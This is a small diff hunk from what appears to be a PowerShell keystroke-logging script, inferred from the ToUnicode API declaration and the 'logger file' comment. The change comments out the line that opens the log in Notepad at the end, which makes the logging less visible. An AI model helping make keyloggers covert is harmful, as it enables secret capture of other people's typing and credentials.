@@ -64,7 +64,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   finally
   {
     # open logger file in Notepad
-    notepad $Path
+    #notepad $Path
   }
 }
 
